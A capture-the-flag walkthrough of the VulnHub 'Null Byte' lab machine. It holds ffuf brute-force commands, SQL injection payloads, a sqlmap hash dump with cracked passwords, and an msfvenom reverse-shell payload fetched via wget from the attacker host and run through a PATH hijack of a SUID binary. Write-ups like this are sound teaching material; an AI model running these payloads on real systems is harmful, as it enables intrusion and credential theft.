# Null Byte VulnHub

```
/changelog.php (Status: 200)                                            
/docs (Status: 301)                                                     
/export.php (Status: 200)                                               
/favicon.ico (Status: 200)                                              
/import.php (Status: 200)                                               
/index.php (Status: 200)
/js (Status: 301)                   
/libraries (Status: 403)  
/license.php (Status: 200)
/locale (Status: 301) 
/navigation.php (Status: 200)
/phpinfo.php (Status: 200)
/setup (Status: 401)  
/sql.php (Status: 200)   
/themes (Status: 301)                                                   
/themes.php (Status: 200)   
/url.php (Status: 302)                                                  
/webapp.php (Status: 200)   
```

Inside docs/html in phpmyadmin
```
/_static (Status: 301)
/config.html (Status: 200)
/copyright.html (Status: 200)
/credits.html (Status: 200)
/developers.html (Status: 200)
/faq.html (Status: 200)
/glossary.html (Status: 200)
/index.html (Status: 200)
/intro.html (Status: 200)
/other.html (Status: 200)
/require.html (Status: 200)
/search.html (Status: 200)
/setup.html (Status: 200)
/transformations.html (Status: 200)
/user.html (Status: 200)
/vendors.html (Status: 200)
```

Site is running PHPMyAdmin **4.2.12** according to docs

using exif tool on the image on the main page revealed the following:
>Comment                         : P-): kzMb5nVYJw

Using it as a directory yielded a page that we can use to upload a key.

## Parameter Fuzzing 
The site accepts a POST request that takes the a parameter called *key*

The following *ffuf* command allows us to apply a wordlist to the target. We must supply the Content-Type header and filter by the word lenght on the site, which with the error message comes out to 19 words.

>$ ffuf -w /usr/share/wordlists/rockyou.txt -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "key=FUZZ" -u http://10.1.62.46
/kzMb5nVYJw/index.php -fw 19

This yields the password *elite* for the site.

>elite                   [Status: 200, Size: 145, Words: 9, Lines: 7]

This gives us a page where we can enumerate users through a query system. If the letter or letters supplied match a username it'll display the matches. 

ffuf again yields two results, the users *ramses* and *isis*. However upon analyzing the result when we supply all alphanumeric characters that the page might be vulnerable to a SQL injection. 

>$ ffuf -w /usr/share/wordlists/usernames.txt -u http://10.1.62.46/kzMb5nVYJw/420search.php?usrtosearch=FUZZ -fs 26
```
a                       [Status: 200, Size: 122, Words: 18, Lines: 2]
am                      [Status: 200, Size: 122, Words: 18, Lines: 2]
e                       [Status: 200, Size: 122, Words: 18, Lines: 2]
es                      [Status: 200, Size: 122, Words: 18, Lines: 2]
i                       [Status: 200, Size: 128, Words: 18, Lines: 2]
is                      [Status: 200, Size: 128, Words: 18, Lines: 2]
isis                    [Status: 200, Size: 128, Words: 18, Lines: 2]
m                       [Status: 200, Size: 122, Words: 18, Lines: 2]
ms                      [Status: 200, Size: 122, Words: 18, Lines: 2]
r                       [Status: 200, Size: 122, Words: 18, Lines: 2]
ra                      [Status: 200, Size: 122, Words: 18, Lines: 2]
ram                     [Status: 200, Size: 122, Words: 18, Lines: 2]
ramses                  [Status: 200, Size: 122, Words: 18, Lines: 2]
s                       [Status: 200, Size: 224, Words: 33, Lines: 2]
se                      [Status: 200, Size: 122, Words: 18, Lines: 2]
si                      [Status: 200, Size: 128, Words: 18, Lines: 2]
sis                     [Status: 200, Size: 128, Words: 18, Lines: 2]
```
## MYSQL Injection
Supplying a " character gives us the message:

> Could not get data: You have an error in your SQL syntax...

Injection payloads:
>" or ''"

The following time based query works:
>"AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe'"

Error based:
>"AND extractvalue(rand(),concat(CHAR(126),version(),CHAR(126)))--"

Returns
>Could not get data: XPATH syntax error: '~5.5.44-0+deb8u1~'

Getting ramses hash:
>sqlmap -u "http://10.1.62.46/kzMb5nVYJw/420search.php?usrtosearch=b" -D seth -T users --dump

>YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE

Decrypts to a hash which decrypts to omega:

>c6d6bd7ebf806f43c76acc3681703b81:omega


Also found hash for phpmyadmin user inside mysql db.

>18DC78FB0C441444482C7D1132C7A23D705DAFA7

Cracks to sunnyvale

## Local Enumeration

- Try kernel exploit
>Linux NullByte 3.16.0-4-686-pae #1 SMP Debian 3.16.7-ckt11-1+deb8u2 (2015-07-17) i686 GNU/Linux

- Try sudo exploit
- nc.traditional found in PATH

- Local ports 631, 25, 3306, 987

Contents of bash history:
```
sudo -s
su eric
exit
ls
clear
cd /var/www
cd backup/
ls
./procwatch 
clear
sudo -s
cd /
ls
exit
```

File procwatch has SUID set for root. But we cannot run sudo commands as ramses. 

## Decompiling Procwatch

We load procwatch into *Ghidra* and analyze the main function which gets decompiled as such:

```
undefined4 main(void)

{
  undefined2 local_42;
  undefined local_40;
  undefined *local_c;
  
  local_c = &stack0x00000004;
  local_42 = 0x7370;
  local_40 = 0;
  system((char *)&local_42);
  return 0;
}
```

This shows that the variable *local_42* is being executed with the *system()* func. The path is not hardcoded so we can leverage this to have the process execute our own ps binary. We confirm this by looking at the bytes assigned to the variable *0x7370*, these translate to sp in little endian or ps.

Create payload
>$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.1.62.42 LPORT=4242 -e x86/shikata_ga_nai -f elf > ps

We download the payload to the */tmp* directory and add it to the PATH variable.

>wget 10.1.62.42:5000/ps -O /tmp/ps
>export PATH=/tmp:$PATH

Running the program yields us a shell back on our listener.

```
disastrpc nullbyte Î» nc -nlvp 4242
listening on [any] 4242 ...
connect to [10.1.62.42] from (UNKNOWN) [10.1.62.46] 41523
whoami
root
```

```
It seems that you have pwned the box, congrats. 
Now you done that I wanna talk with you. Write a walk & mail at
xly0n@sigaint.org attach the walk and proof.txt
If sigaint.org is down you may mail at nbsly0n@gmail.com


USE THIS PGP PUBLIC KEY

-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: BCPG C# v1.6.1.0

mQENBFW9BX8BCACVNFJtV4KeFa/TgJZgNefJQ+fD1+LNEGnv5rw3uSV+jWigpxrJ
Q3tO375S1KRrYxhHjEh0HKwTBCIopIcRFFRy1Qg9uW7cxYnTlDTp9QERuQ7hQOFT
e4QU3gZPd/VibPhzbJC/pdbDpuxqU8iKxqQr0VmTX6wIGwN8GlrnKr1/xhSRTprq
Cu7OyNC8+HKu/NpJ7j8mxDTLrvoD+hD21usssThXgZJ5a31iMWj4i0WUEKFN22KK
+z9pmlOJ5Xfhc2xx+WHtST53Ewk8D+Hjn+mh4s9/pjppdpMFUhr1poXPsI2HTWNe
YcvzcQHwzXj6hvtcXlJj+yzM2iEuRdIJ1r41ABEBAAG0EW5ic2x5MG5AZ21haWwu
Y29tiQEcBBABAgAGBQJVvQV/AAoJENDZ4VE7RHERJVkH/RUeh6qn116Lf5mAScNS
HhWTUulxIllPmnOPxB9/yk0j6fvWE9dDtcS9eFgKCthUQts7OFPhc3ilbYA2Fz7q
m7iAe97aW8pz3AeD6f6MX53Un70B3Z8yJFQbdusbQa1+MI2CCJL44Q/J5654vIGn
XQk6Oc7xWEgxLH+IjNQgh6V+MTce8fOp2SEVPcMZZuz2+XI9nrCV1dfAcwJJyF58
kjxYRRryD57olIyb9GsQgZkvPjHCg5JMdzQqOBoJZFPw/nNCEwQexWrgW7bqL/N8
TM2C0X57+ok7eqj8gUEuX/6FxBtYPpqUIaRT9kdeJPYHsiLJlZcXM0HZrPVvt1HU
Gms=
=PiAQ
-----END PGP PUBLIC KEY BLOCK-----
```
